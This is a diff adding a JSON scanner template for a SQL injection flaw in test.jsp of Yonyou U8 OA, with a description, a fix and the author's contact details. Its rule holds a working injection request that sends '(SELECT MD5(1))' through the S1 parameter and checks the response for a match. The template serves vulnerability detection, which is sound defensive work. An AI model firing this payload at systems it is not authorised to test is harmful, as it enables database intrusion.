@@ -1,0 +1,24 @@
+{
+    "vul_name": "用友 U8 OA test.jsp文件存在 SQL注入漏洞",
+    "level": "中危",
+    "description": "用友 U8 OA test.jsp文件存在 SQL注入漏洞，由于与致远OA使用相同的文件，于是存在了同样的漏洞",
+    "product": "用友 U8 OA",
+    "version": "用友 U8 OA",
+    "cve": "无",
+    "reference": "https://peiqi.wgpsec.org/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20U8%20OA%20test.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html",
+    "fixing": "限制接口权限或删除test.jsp",
+    "rule": {
+        "path": "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))",
+        "method": "GET",
+        "headers": "",
+        "body": "",
+        "status_code": "200",
+        "keywords": "MD5(1)",
+        "res_time": ""
+    },
+    "operator": {
+        "author": "浪飒",
+        "email": "langsa-hy@qq.com",
+        "github": "https://github.com/langsasec"
+    }
+}
